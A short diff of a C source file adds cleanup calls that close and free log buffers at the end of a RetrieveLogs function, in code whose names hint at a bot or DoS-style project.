@@ -137,6 +137,10 @@ void RetrieveLogs(ExDos *c) {
     str *logs = string(raw_logs->data);
     c->Logs = Array( !strcmp(logs->data, " ") ? NULL : (strstr(logs->data, "\n") ? logs->Split(logs, "\n") : NULL) );
     c->LogCount = c->Logs->idx;
+
+    raw_logs->Close(raw_logs);
+    free(logs);
+    free(raw_logs);
 }
 
 //start a bot server here
